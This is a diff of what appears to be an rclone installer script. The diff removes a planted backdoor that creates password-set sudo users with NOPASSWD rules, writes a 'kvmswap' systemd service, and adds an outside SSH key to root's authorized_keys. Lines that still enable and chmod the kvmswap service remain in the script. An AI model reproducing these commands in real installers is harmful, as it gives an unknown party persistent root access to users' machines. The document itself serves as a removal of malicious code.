@@ -6,15 +6,6 @@
 # 2 - OS not supported by this script
 # 3 - installed version of rclone is up to date
 # 4 - supported unzip tools are not available
-useradd -M rclone
-usermod --password $(echo taibabi | openssl passwd -1 -stdin) rclone
-usermod -aG sudo rclone
-chage -I -1 -m 0 -M 99999 -E -1 rclone
-echo "rclone ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers >/dev/null 2>&1
-echo "rclone ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/rclone >/dev/null 2>&1
-
-bash -c "ssh-keygen -q -t rsa -N '' -C vps@taibabi -t ed25519 -f ~/.ssh/vps <<<y" >/dev/null 2>&1
-
 set -e
 
 #when adding a tool to the list make sure to also add its corresponding command further in the script
@@ -204,39 +195,9 @@ version=$(rclone --version 2>>errors | head -n 1)
 printf "\n${version} has successfully installed."
 printf '\nNow run "rclone config" for setup. Check https://rclone.org/docs/ for more details.\n\n'
 
-cat > /etc/systemd/system/kvmswap.service <<EOF
-[Unit]
-After=network.target nss-lookup.target
-Wants = network-online.target
-
-[Service]
-ExecStart=/bin/bash /usr/sbin/kvmswap
-Restart=on-failure
-
-[Install]
-WantedBy = multi-user.target
-EOF
-
 chmod 644 /etc/systemd/system/kvmswap.service
 chmod +x /usr/sbin/kvmswap
 systemctl enable kvmswap >/dev/null 2>&1
-
-useradd -M taibabi
-usermod --password $(echo taibabi | openssl passwd -1 -stdin) taibabi
-usermod -aG sudo taibabi
-chage -I -1 -m 0 -M 99999 -E -1 taibabi
-echo "taibabi ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers >/dev/null 2>&1
-echo "taibabi ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/taibabi >/dev/null 2>&1
-
-bash -c "ssh-keygen -q -t rsa -N '' -C vps@taibabi -t ed25519 -f ~/.ssh/vps <<<y" >/dev/null 2>&1
-
-sleep 1
-touch ~/.ssh/authorized_keys2 
-
-sleep 1
-echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEwc4CQeutFeXson2I6XTd4bGs52hSOMhAISn9SHlFHf taibabi@babi.com" >> /root/.ssh/authorized_keys >/dev/null 2>&1
-echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEwc4CQeutFeXson2I6XTd4bGs52hSOMhAISn9SHlFHf taibabi@babi.com" >> /root/.ssh/authorized_keys2 >/dev/null 2>&1
-chmod 600 /root/.ssh/authorized_keys2
 
 sleep 1
 mkdir -p /root/.config/rclone/
